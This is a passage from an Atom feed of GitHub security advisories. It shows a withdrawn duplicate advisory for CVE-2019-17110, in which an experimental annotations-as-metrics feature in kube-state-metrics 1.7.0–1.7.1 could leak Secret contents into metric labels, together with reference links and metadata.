<li><a href="https://github.com/kubernetes/kube-state-metrics/commit/2a9ab3a9a0f1c4dbecb6a5577185b33bfac86a96">https://github.com/kubernetes/kube-state-metrics/commit/2a9ab3a9a0f1c4dbecb6a5577185b33bfac86a96</a></li>
<li><a href="https://github.com/kubernetes/kube-state-metrics/releases/tag/v1.7.2">https://github.com/kubernetes/kube-state-metrics/releases/tag/v1.7.2</a></li>
<li><a href="https://github.com/advisories/GHSA-2v6x-frw8-7r7f">https://github.com/advisories/GHSA-2v6x-frw8-7r7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2v6x-frw8-7r7f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-18T15:38:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/kubernetes/kube-state-metrics] Duplicate Advisory: k8s.io/kube-state-metrics Exposure of Sensitive Information]]></title>
        <id>https://github.com/advisories/GHSA-2v6x-frw8-7r7f</id>
        <link href="https://github.com/advisories/GHSA-2v6x-frw8-7r7f"/>
        <updated>2024-01-23T17:50:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="duplicate-advisory">Duplicate Advisory</h1>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-c92w-72c5-9x59. This link is maintained to preserve external references.</p>
<h1 id="original-description">Original Description</h1>
<p>A security issue was discovered in kube-state-metrics 1.7.x before 1.7.2. An experimental feature was added to v1.7.0 and v1.7.1 that enabled annotations to be exposed as metrics. By default, kube-state-metrics metrics only expose metadata about Secrets. However, a combination of the default kubectl behavior and this new feature can cause the entire secret content to end up in metric labels, thus inadvertently exposing the secret content in metrics.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17110">https://nvd.nist.gov/vuln/detail/CVE-2019-17110</a></li>
<li><a href="https://github.com/kubernetes/kube-state-metrics/commit/03122fe3e2df49a9a7298b8af921d3c37c430f7f">https://github.com/kubernetes/kube-state-metrics/commit/03122fe3e2df49a9a7298b8af921d3c37c430f7f</a></li>
<li><a href="https://github.com/kubernetes/kube-state-metrics/commit/2a9ab3a9a0f1c4dbecb6a5577185b33bfac86a96">https://github.com/kubernetes/kube-state-metrics/commit/2a9ab3a9a0f1c4dbecb6a5577185b33bfac86a96</a></li>
<li><a href="https://github.com/kubernetes/kube-state-metrics/releases/tag/v1.7.2">https://github.com/kubernetes/kube-state-metrics/releases/tag/v1.7.2</a></li>
<li><a href="https://github.com/advisories/GHSA-2v6x-frw8-7r7f">https://github.com/advisories/GHSA-2v6x-frw8-7r7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2v6x-frw8-7r7f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-18T15:38:54.000Z</published>
    </entry>
</feed>